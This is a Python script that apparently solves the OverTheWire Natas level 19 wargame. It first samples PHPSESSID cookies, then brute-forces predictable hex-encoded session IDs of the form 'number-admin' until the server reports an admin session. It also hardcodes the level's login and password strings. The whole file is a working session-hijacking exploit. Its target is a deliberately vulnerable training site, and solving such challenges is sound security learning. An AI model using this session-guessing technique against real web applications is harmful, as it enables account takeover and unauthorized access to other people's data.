import requests
from requests.auth import HTTPBasicAuth

s = requests.Session()
url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

PASSWORD = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

def t():
    for i in range(10):
        params = { "username": "natas20", "password": "a" }
        res = s.post(url, auth=auth, data=params)
                    
        c = res.cookies["PHPSESSID"]
        print(c)
        
        s.cookies.clear()
    

def f():
    for a in range(0,641):
            params = { "username": "admin", "password": "a" }
            test = f"{a}-{params["username"]}"
            cookies = { "PHPSESSID": test.encode("utf-8").hex() }
            
            print(cookies)
            

            res = s.post(url, auth=auth, data=params, cookies=cookies)
            s.cookies.clear()

            if "You are an admin" in res.text:
                print(res.text)
                return

f()
